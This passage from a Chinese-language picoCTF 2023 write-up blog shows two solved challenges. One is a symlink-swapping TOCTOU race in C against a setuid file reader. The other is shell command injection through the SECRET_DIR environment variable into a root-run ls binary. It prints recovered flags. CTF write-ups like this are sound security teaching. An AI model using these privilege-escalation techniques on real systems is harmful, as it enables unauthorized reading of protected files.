class="line">-rw-r--r-- 1 ctf-player ctf-player 912 Mar 16 01:30 src.cpp</span><br><span class="line">-rwsr-xr-x 1 root       root       19K Mar 16 02:28 txtreader</span><br><span class="line">ctf-player@pico-chall$ ./txtreader flag</span><br><span class="line">Error: you don&#x27;t own this file</span><br></pre></td></tr></table></figure>

<p>可以發現現在讀取<code>flag</code>已經等於讀取<code>flag.txt</code>了，但我們依然沒有權限。接著我參考了<a target="_blank" rel="noopener" href="https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c">這裡</a>的攻擊碼，把他在server裡面編譯成<code>race</code>可執行檔。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    syscall(SYS_renameat2, AT_FDCWD, argv[<span class="number">1</span>], AT_FDCWD, argv[<span class="number">2</span>], RENAME_EXCHANGE);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc race.c -o race</span></span><br></pre></td></tr></table></figure>

<p>這個時候我們已經具備了我們所需要的條件，執行以下指令讓攻擊碼跑起來。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ ./race asd flag</span><br></pre></td></tr></table></figure>

<p>我們開啟另一個視窗去觀察軟連結的狀態：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ ls -alh</span><br><span class="line">total 56K</span><br><span class="line">drwxr-xr-x 1 ctf-player ctf-player  83 Mar 30 09:20 .</span><br><span class="line">drwxr-xr-x 1 root       root        24 Mar 16 02:27 ..</span><br><span class="line">drwx------ 2 ctf-player ctf-player  34 Mar 30 09:18 .cache</span><br><span class="line">drwxrwxr-x 3 ctf-player ctf-player  19 Mar 30 09:18 .local</span><br><span class="line">-rw-r--r-- 1 root       root        67 Mar 16 02:28 .profile</span><br><span class="line">lrwxrwxrwx 1 ctf-player ctf-player   8 Mar 30 09:19 asd -&gt; flag.txt</span><br><span class="line">-rw-rw-r-- 1 ctf-player ctf-player   0 Mar 30 09:19 flag</span><br><span class="line">-rw------- 1 root       root        32 Mar 16 02:28 flag.txt</span><br><span class="line">-rwxrwxr-x 1 ctf-player ctf-player 17K Mar 30 09:18 race</span><br><span class="line">-rw-rw-r-- 1 ctf-player ctf-player 295 Mar 30 09:18 race.c</span><br><span class="line">-rw-r--r-- 1 ctf-player ctf-player 912 Mar 16 01:30 src.cpp</span><br><span class="line">-rwsr-xr-x 1 root       root       19K Mar 16 02:28 txtreader</span><br><span class="line">ctf-player@pico-chall$ ls -alh</span><br><span class="line">ls: cannot read symbolic link &#x27;flag&#x27;: Invalid argument</span><br><span class="line">ls: cannot read symbolic link &#x27;asd&#x27;: Invalid argument</span><br><span class="line">total 56K</span><br><span class="line">drwxr-xr-x 1 ctf-player ctf-player  83 Mar 30 09:20 .</span><br><span class="line">drwxr-xr-x 1 root       root        24 Mar 16 02:27 ..</span><br><span class="line">drwx------ 2 ctf-player ctf-player  34 Mar 30 09:18 .cache</span><br><span class="line">drwxrwxr-x 3 ctf-player ctf-player  19 Mar 30 09:18 .local</span><br><span class="line">-rw-r--r-- 1 root       root        67 Mar 16 02:28 .profile</span><br><span class="line">lrwxrwxrwx 1 ctf-player ctf-player   8 Mar 30 09:19 asd</span><br><span class="line">lrwxrwxrwx 1 ctf-player ctf-player   8 Mar 30 09:19 flag</span><br><span class="line">-rw------- 1 root       root        32 Mar 16 02:28 flag.txt</span><br><span class="line">-rwxrwxr-x 1 ctf-player ctf-player 17K Mar 30 09:18 race</span><br><span class="line">-rw-rw-r-- 1 ctf-player ctf-player 295 Mar 30 09:18 race.c</span><br><span class="line">-rw-r--r-- 1 ctf-player ctf-player 912 Mar 16 01:30 src.cpp</span><br><span class="line">-rwsr-xr-x 1 root       root       19K Mar 16 02:28 txtreader</span><br><span class="line">ctf-player@pico-chall$ ls -alh</span><br><span class="line">total 56K</span><br><span class="line">drwxr-xr-x 1 ctf-player ctf-player  83 Mar 30 09:20 .</span><br><span class="line">drwxr-xr-x 1 root       root        24 Mar 16 02:27 ..</span><br><span class="line">drwx------ 2 ctf-player ctf-player  34 Mar 30 09:18 .cache</span><br><span class="line">drwxrwxr-x 3 ctf-player ctf-player  19 Mar 30 09:18 .local</span><br><span class="line">-rw-r--r-- 1 root       root        67 Mar 16 02:28 .profile</span><br><span class="line">-rw-rw-r-- 1 ctf-player ctf-player   0 Mar 30 09:19 asd</span><br><span class="line">lrwxrwxrwx 1 ctf-player ctf-player   8 Mar 30 09:19 flag -&gt; flag.txt</span><br><span class="line">-rw------- 1 root       root        32 Mar 16 02:28 flag.txt</span><br><span class="line">-rwxrwxr-x 1 ctf-player ctf-player 17K Mar 30 09:18 race</span><br><span class="line">-rw-rw-r-- 1 ctf-player ctf-player 295 Mar 30 09:18 race.c</span><br><span class="line">-rw-r--r-- 1 ctf-player ctf-player 912 Mar 16 01:30 src.cpp</span><br><span class="line">-rwsr-xr-x 1 root       root       19K Mar 16 02:28 txtreader</span><br></pre></td></tr></table></figure>

<p>可以發現他的指向一直在改變，那我們用<code>txtreader</code>讀<code>flag</code>，就有$\dfrac{1}{2}$的機率可以讀到<code>flag.txt</code>的內容，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ ./txtreader flag</span><br><span class="line">ctf-player@pico-chall$ ./txtreader flag</span><br><span class="line">picoCTF&#123;ToctoU_!s_3a5y_f482a247&#125;</span><br></pre></td></tr></table></figure>

<h2 id="VNE"><a href="#VNE" class="headerlink" title="VNE"></a>VNE</h2><div class="note warning flat"><p>AUTHOR: JUNIAS BONOU</p>
<p>Description<br>We’ve got a binary that can list directories as root, try it out !!<br><strong>200 Points</strong></p>
</div>

<p>這題標籤上面寫著env、injection，看來是跟injection有關的題目，一樣進去看看他有什麼東西可以利用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ ssh ctf-player@saturn.picoctf.net -p 54891</span><br><span class="line">ctf-player@saturn.picoctf.net&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.15.0-1031-aws x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line">Last login: Thu Mar 30 09:56:09 2023 from 127.0.0.1</span><br><span class="line">ctf-player@pico-chall$ ls -al</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 ctf-player ctf-player    41 Mar 30 09:56 .</span><br><span class="line">drwxr-xr-x 1 root       root          24 Mar 16 01:59 ..</span><br><span class="line">-rw------- 1 ctf-player ctf-player    21 Mar 30 09:56 .bash_history</span><br><span class="line">drwx------ 2 ctf-player ctf-player    34 Mar 30 09:56 .cache</span><br><span class="line">-rw-r--r-- 1 root       root          67 Mar 16 01:59 .profile</span><br><span class="line">-rwsr-xr-x 1 root       root       18752 Mar 16 01:59 bin</span><br><span class="line">ctf-player@pico-chall$ ./bin</span><br><span class="line">Error: SECRET_DIR environment variable is not set</span><br></pre></td></tr></table></figure>

<p>執行的時候說<code>SECRET_DIR</code>沒有設定，看起來應該是要設定路徑的名稱，馬上來試試看。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ export SECRET_DIR=/</span><br><span class="line">ctf-player@pico-chall$ ./bin</span><br><span class="line">Listing the content of / as root:</span><br><span class="line">bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr</span><br><span class="line">boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var</span><br></pre></td></tr></table></figure>

<p>看起來是個用root權限執行<code>ls</code>的檔案，但我們要讀取的話怎麼辦呢?他的指令看起來是類似於<code>ls &lt;SECRET_DIR&gt;</code>的結構，因此我們只要在SECRET_DIR裡面動手腳，或許就能讀取東西了，如下所示，成功獲得flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ export SECRET_DIR=&quot;/;cat /challenge/metadata.json&quot;</span><br><span class="line">ctf-player@pico-chall$ ./bin</span><br><span class="line">Listing the content of /;cat /challenge/metadata.json as root:</span><br><span class="line">bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr</span><br><span class="line">boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var</span><br><span class="line">&#123;&quot;flag&quot;: &quot;picoCTF&#123;Power_t0_man!pul4t3_3nv_1670f174&#125;&quot;, &quot;password&quot;: &quot;3f39b042&quot;&#125;</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:alb105322129@gmail.com">Albert Huang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://albert-notes.github.io/2023/03/30/picoctf-2023/">http://albert-notes.github.io/2023/03/30/picoctf-2023/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Security/">Security</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Education/">Education</a><a class="post-meta__tags" href="/tags/picoCTF/">picoCTF</a></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/30/ctf-reverse-1/"><img class="prev-cover" src="/img/mlw.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CTF系列-Reverse Engineering逆向工程基礎I</div></div></a></div><div class="next-post pull-right"><a href="/2023/05/27/AIS3-2023-preexam/"><img class="next-cover" src="/img/ais4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">2023 AIS3 Pre-exam Write Up</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/01/30/ctf-reverse-1/" title="CTF系列-Reverse Engineering逆向工程基礎I"><img class="cover" src="/img/mlw.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-30</div><div class="title">CTF系列-Reverse Engineering逆向工程基礎I</div></div></a></div><div><a href="/2023/01/28/ctf-crypto-2/" title="CTF系列-Cryptography密碼學進階I"><img class="cover" src="/img/cgy.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-28</div><div class="title">CTF系列-Cryptography密碼學進階I</div></div></a></div><div><a href="/2023/01/26/ctf-crypto-1/" title="CTF系列-Cryptography密碼學基礎"><img class="cover" src="/img/enc.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-26</div><div class="title">CTF系列-Cryptography密碼學基礎</div></div></a></div><div><a href="/2023/01/24/ctf-web-1/" title="CTF系列-Web網路安全基礎I"><img class="cover" src="/img/sql.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-24</div><div class="title">CTF系列-Web網路安全基礎I</div></div></a></div><div><a href="/2023/05/27/AIS3-2023-preexam/" title="2023 AIS3 Pre-exam Write Up"><img class="cover" src="/img/ais4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-27</div><div class="title">2023 AIS3 Pre-exam Write Up</div></div></a></div><div><a href="/2022/06/11/AIS3-2022-preexam/" title="2022 AIS3 Pre-exam Write Up"><img class="cover" src="/img/ais2.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-11</div><div class="title">2022 AIS3 Pre-exam Write Up</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/alb.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Albert Huang</div><div class="author-info__description">Decide your own life.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">21</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">22</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/albert-notes"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/albert-notes" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:alb105322129@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://www.facebook.com/albert.huang.57/" target="_blank" title="Facebook"><i class="fab fa-facebook"></i></a><a class="social-icon" href="https://www.instagram.com/albert.huang_57/" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">《拓》 2022 全國高中生大合唱出爐囉 ! 趕快去 Music 分頁點播 !</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Exploitation"><span class="toc-number">1.</span> <span class="toc-text">Web Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#findme"><span class="toc-number">1.1.</span> <span class="toc-text">findme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MatchTheRegex"><span class="toc-number">1.2.</span> <span class="toc-text">MatchTheRegex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SOAP"><span class="toc-number">1.3.</span> <span class="toc-text">SOAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#More-SQLi"><span class="toc-number">1.4.</span> <span class="toc-text">More SQLi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-Code-Analysis"><span class="toc-number">1.5.</span> <span class="toc-text">Java Code Analysis!?!</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cryptography"><span class="toc-number">2.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HideToSee"><span class="toc-number">2.1.</span> <span class="toc-text">HideToSee</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ReadMyCert"><span class="toc-number">2.2.</span> <span class="toc-text">ReadMyCert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rotation"><span class="toc-number">2.3.</span> <span class="toc-text">rotation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PowerAnalysis-Warmup"><span class="toc-number">2.4.</span> <span class="toc-text">PowerAnalysis: Warmup</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse-Engineering"><span class="toc-number">3.</span> <span class="toc-text">Reverse Engineering</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ready-Gladiator-0"><span class="toc-number">3.1.</span> <span class="toc-text">Ready Gladiator 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reverse"><span class="toc-number">3.2.</span> <span class="toc-text">Reverse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Safe-Opener-2"><span class="toc-number">3.3.</span> <span class="toc-text">Safe Opener 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#timer"><span class="toc-number">3.4.</span> <span class="toc-text">timer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Virtual-Machine-0"><span class="toc-number">3.5.</span> <span class="toc-text">Virtual Machine 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#No-way-out"><span class="toc-number">3.6.</span> <span class="toc-text">No way out</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ready-Gladiator-1"><span class="toc-number">3.7.</span> <span class="toc-text">Ready Gladiator 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Virtual-Machine-1"><span class="toc-number">3.8.</span> <span class="toc-text">Virtual Machine 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ready-Gladiator-2"><span class="toc-number">3.9.</span> <span class="toc-text">Ready Gladiator 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Forensics"><span class="toc-number">4.</span> <span class="toc-text">Forensics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hideme"><span class="toc-number">4.1.</span> <span class="toc-text">hideme</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PcapPoisoning"><span class="toc-number">4.2.</span> <span class="toc-text">PcapPoisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#who-is-it"><span class="toc-number">4.3.</span> <span class="toc-text">who is it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FindAndOpen"><span class="toc-number">4.4.</span> <span class="toc-text">FindAndOpen</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSB"><span class="toc-number">4.5.</span> <span class="toc-text">MSB</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#General-Skills"><span class="toc-number">5.</span> <span class="toc-text">General Skills</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#chrono"><span class="toc-number">5.1.</span> <span class="toc-text">chrono</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#money-ware"><span class="toc-number">5.2.</span> <span class="toc-text">money-ware</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Permissions"><span class="toc-number">5.3.</span> <span class="toc-text">Permissions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#repetitions"><span class="toc-number">5.4.</span> <span class="toc-text">repetitions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#useless"><span class="toc-number">5.5.</span> <span class="toc-text">useless</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Special"><span class="toc-number">5.6.</span> <span class="toc-text">Special</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Specialer"><span class="toc-number">5.7.</span> <span class="toc-text">Specialer</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Binary-Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Binary Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babygame01"><span class="toc-number">6.1.</span> <span class="toc-text">babygame01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#two-sum"><span class="toc-number">6.2.</span> <span class="toc-text">two-sum</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hijacking"><span class="toc-number">6.3.</span> <span class="toc-text">hijacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tic-tac"><span class="toc-number">6.4.</span> <span class="toc-text">tic-tac</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNE"><span class="toc-number">6.5.</span> <span class="toc-text">VNE</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/05/27/AIS3-2023-preexam/" title="2023 AIS3 Pre-exam Write Up"><img src="/img/ais4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2023 AIS3 Pre-exam Write Up"/></a><div class="content"><a class="title" href="/2023/05/27/AIS3-2023-preexam/" title="2023 AIS3 Pre-exam Write Up">2023 AIS3 Pre-exam Write Up</a><time datetime="2023-05-27T14:49:43.000Z" title="Created 2023-05-27 22:49:43">2023-05-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/30/picoctf-2023/" title="picoCTF 2023 Write Up"><img src="/img/picoctf.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="picoCTF 2023 Write Up"/></a><div class="content"><a class="title" href="/2023/03/30/picoctf-2023/" title="picoCTF 2023 Write Up">picoCTF 2023 Write Up</a><time datetime="2023-03-30T10:09:42.000Z" title="Created 2023-03-30 18:09:42">2023-03-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/30/ctf-reverse-1/" title="CTF系列-Reverse Engineering逆向工程基礎I"><img src="/img/mlw.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF系列-Reverse Engineering逆向工程基礎I"/></a><div class="content"><a class="title" href="/2023/01/30/ctf-reverse-1/" title="CTF系列-Reverse Engineering逆向工程基礎I">CTF系列-Reverse Engineering逆向工程基礎I</a><time datetime="2023-01-30T05:44:27.000Z" title="Created 2023-01-30 13:44:27">2023-01-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/28/ctf-crypto-2/" title="CTF系列-Cryptography密碼學進階I"><img src="/img/cgy.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF系列-Cryptography密碼學進階I"/></a><div class="content"><a class="title" href="/2023/01/28/ctf-crypto-2/" title="CTF系列-Cryptography密碼學進階I">CTF系列-Cryptography密碼學進階I</a><time datetime="2023-01-28T13:41:20.000Z" title="Created 2023-01-28 21:41:20">2023-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/26/ctf-crypto-1/" title="CTF系列-Cryptography密碼學基礎"><img src="/img/enc.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF系列-Cryptography密碼學基礎"/></a><div class="content"><a class="title" href="/2023/01/26/ctf-crypto-1/" title="CTF系列-Cryptography密碼學基礎">CTF系列-Cryptography密碼學基礎</a><time datetime="2023-01-26T14:58:44.000Z" title="Created 2023-01-26 22:58:44">2023-01-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Albert Huang</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="Increase font size"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="Decrease font size"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', '', 'katex-wrap')
  })
})()</script><script>if (document.getElementsByClassName('mermaid').length) {
  if (window.mermaidJsLoad) mermaid.init()
  else {
    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
      window.mermaidJsLoad = true
      mermaid.initialize({
        theme: 'default',
      })
      false && mermaid.init()
    })
  }
